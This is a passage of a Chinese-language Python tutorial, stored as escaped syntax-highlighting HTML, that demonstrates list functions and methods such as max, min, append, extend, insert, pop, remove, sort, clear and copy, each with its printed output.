list2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 创建一个 0-4 的列表&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;list2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 5&lt;/span&gt;

list1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; list2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Google&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Runoob&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Taobao&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;456&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;700&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;200&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;list1 最大元素值 : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;max&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;list1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# list1 最大元素值 :  Taobao&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;list2 最大元素值 : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;max&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;list2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# list2 最大元素值 :  700&lt;/span&gt;

list1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; list2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Google&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Runoob&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Taobao&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;456&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;700&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;200&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;list1 最小元素值 : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;min&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;list1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# list1 最小元素值 :  Google&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;list2 最小元素值 : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;min&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;list2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# list2 最小元素值 :  200&lt;/span&gt;

aTuple &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;123&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Google&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Runoob&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Taobao&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
list1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;aTuple&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;列表元素 : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; list1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 列表元素 :  [123, &#39;Google&#39;, &#39;Runoob&#39;, &#39;Taobao&#39;]&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Hello World&#34;&lt;/span&gt;
list2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;列表元素 : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; list2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 列表元素 :  [&#39;H&#39;, &#39;e&#39;, &#39;l&#39;, &#39;l&#39;, &#39;o&#39;, &#39; &#39;, &#39;W&#39;, &#39;o&#39;, &#39;r&#39;, &#39;l&#39;, &#39;d&#39;]&lt;/span&gt;

list1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Google&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Runoob&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Taobao&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
list1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;append&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Baidu&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;更新后的列表 : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; list1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 更新后的列表 :  [&#39;Google&#39;, &#39;Runoob&#39;, &#39;Taobao&#39;, &#39;Baidu&#39;]&lt;/span&gt;

aList &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;123&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Google&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Runoob&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Taobao&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;123&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;123 元素个数 : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; aList&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;count&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;123&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 123 元素个数 :  2&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Runoob 元素个数 : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; aList&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;count&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Runoob&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# Runoob 元素个数 :  1&lt;/span&gt;

list1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Google&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Runoob&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Taobao&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
list2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 创建 0-4 的列表&lt;/span&gt;
list1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;extend&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;list2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 扩展列表&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;扩展后的列表：&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; list1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 扩展后的列表： [&#39;Google&#39;, &#39;Runoob&#39;, &#39;Taobao&#39;, 0, 1, 2, 3, 4]&lt;/span&gt;

list1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Google&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Runoob&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Taobao&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Runoob 索引值为&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; list1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;index&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Runoob&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# Runoob 索引值为 1&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Taobao 索引值为&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; list1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;index&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Taobao&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# Taobao 索引值为 2&lt;/span&gt;

list1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Google&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Runoob&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Taobao&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
list1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;insert&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Baidu&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;列表插入元素后为 : &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; list1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 列表插入元素后为 :  [&#39;Google&#39;, &#39;Baidu&#39;, &#39;Runoob&#39;, &#39;Taobao&#39;]&lt;/span&gt;

list1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Google&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Runoob&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Taobao&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
list1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;pop&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;列表现在为 : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; list1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 列表现在为 :  [&#39;Google&#39;, &#39;Runoob&#39;]&lt;/span&gt;
list1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;pop&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;列表现在为 : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; list1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 列表现在为 :  [&#39;Google&#39;]&lt;/span&gt;

list1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Google&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Runoob&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Taobao&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Baidu&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
list1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;remove&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Taobao&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;列表现在为 : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; list1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 列表现在为 :  [&#39;Google&#39;, &#39;Runoob&#39;, &#39;Baidu&#39;]&lt;/span&gt;
list1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;remove&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Baidu&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;列表现在为 : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; list1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 列表现在为 :  [&#39;Google&#39;, &#39;Runoob&#39;]&lt;/span&gt;

list1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Google&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Runoob&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Taobao&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Baidu&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
list1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;reverse&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;列表反转后: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; list1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 列表反转后:  [&#39;Baidu&#39;, &#39;Taobao&#39;, &#39;Runoob&#39;, &#39;Google&#39;]&lt;/span&gt;

aList &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Google&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Runoob&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Taobao&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Facebook&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
aList&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sort&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;List : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; aList&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# List :  [&#39;Facebook&#39;, &#39;Google&#39;, &#39;Runoob&#39;, &#39;Taobao&#39;]&lt;/span&gt;

list1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Google&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Runoob&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Taobao&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Baidu&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
list1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;clear&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;列表清空后 : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; list1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 列表清空后 :  []&lt;/span&gt;

list1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Google&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Runoob&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Taobao&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Baidu&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
list2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; list1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;copy&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;list2 列表: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; list2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# list2 列表:  [&#39;Google&#39;, &#39;Runoob&#39;, &#39;Taobao&#39;, &#39;Baidu&#39;]&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
3
5
list1 最大元素值 :  Taobao
list2 最大元素值 :  700
list1 最小元素值 :  Google
list2 最小元素值 :  200
列表元素 :  [123, &#39;Google&#39;, &#39;Runoob&#39;, &#39;Taobao&#39;]
